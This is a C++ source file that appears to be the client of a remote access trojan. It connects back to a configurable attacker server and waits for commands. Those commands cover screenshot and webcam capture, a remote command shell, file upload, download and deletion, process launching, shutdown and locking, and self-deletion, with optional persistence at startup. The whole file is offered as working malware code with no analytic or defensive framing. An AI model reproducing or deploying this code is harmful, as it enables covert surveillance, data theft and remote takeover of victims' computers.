#include <iostream>
#include <unistd.h>
#include <windows.h>
#include <fstream>
#include <vector>
#include <algorithm>
#include <dirent.h>
#include <dshow.h>

const std::string SERVER = "<SERVER IP>";
const int PORT = 5005;

std::vector<std::string> fileLog;
std::string username = getenv("username");
std::string computer = getenv("computername");
std::string appdata = getenv("appdata");
std::string command, data;

SOCKET objSocket;
char buffer[8192];
const bool startup = false;
const int TIMEOUT = 300000;

#include "RegisterStartup.cpp"
#include "VBSMessageBox.cpp"
#include "CaptureScreenshot.cpp"
#include "CaptureWebcam.cpp"
#include "ChangeWallpaper.cpp"
#include "StartProcess.cpp"
#include "RemoteCMD.cpp"
#include "ViewFiles.cpp"
#include "SendFile.cpp"
#include "ReceiveFile.cpp"
#include "DeleteFile.cpp"
#include "DeleteSelf.cpp"

int main()
{
    WSADATA wsdata;
    struct in_addr addr;

    if (WSAStartup(MAKEWORD(2, 2), &wsdata) != 0) return EXIT_FAILURE;
    addr.s_addr = *(u_long*) gethostbyname(SERVER.data())->h_addr_list[0];

    objSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (objSocket == SOCKET_ERROR) return EXIT_FAILURE;

    sockaddr_in client;
    client.sin_family = AF_INET;
    client.sin_port = htons(PORT);
    client.sin_addr.s_addr = inet_addr(inet_ntoa(addr));
    setsockopt(objSocket, SOL_SOCKET, SO_RCVTIMEO, (char*)&TIMEOUT, sizeof(TIMEOUT));

    if (connect(objSocket, (sockaddr*)&client, sizeof(client)) == SOCKET_ERROR) {
        closesocket(objSocket);
        WSACleanup();
        main();
    }
    if (startup) RegisterStartup(__FILE__);
    send(computer + "|" + username);

    while (true)
    {
        int server = recv(objSocket, buffer, sizeof(buffer), 0);
        if (server == SOCKET_ERROR || server == NO_BYTES_IN_BUFFER) {
            closesocket(objSocket);
            WSACleanup();
            main();
        }
        command = buffer;
        clearLogs();

        if (command == "terminate") {
            closesocket(objSocket);
            WSACleanup();
            exit(0);
		}
        else if (command == "msgbox") {
            VBSMessageBox();
        }
        else if (command == "screenshot") {
            CaptureScreenshot();
        }
        else if (command == "webcam") {
            CaptureWebcam();
        }
        else if (command == "wallpaper") {
            ChangeWallpaper();
        }
        else if (command == "process") {
            StartProcess();
        }
        else if (command == "remote") {
            RemoteCMD();
        }
        else if (command == "shutdown") {
            system("shutdown /p");
        }
        else if (command == "restart") {
            system("restart /r");
        }
        else if (command == "lock") {
            system("rundll32.exe user32.dll,LockWorkStation");
        }
        else if (command == "directory") {
            getcwd(buffer, FILENAME_MAX);
            send(buffer);
        }
        else if (command == "files") {
            ViewFiles();
        }
        else if (command == "send") {
            SendFile();
        }
        else if (command == "receive") {
            ReceiveFile();
        }
        else if (command == "delfile") {
            DeleteFile();
        }
        else if (command == "delself") {
            DeleteSelf();
        }

        memset(buffer, 0, sizeof(buffer));
        command.clear();
        data.clear();
    }
}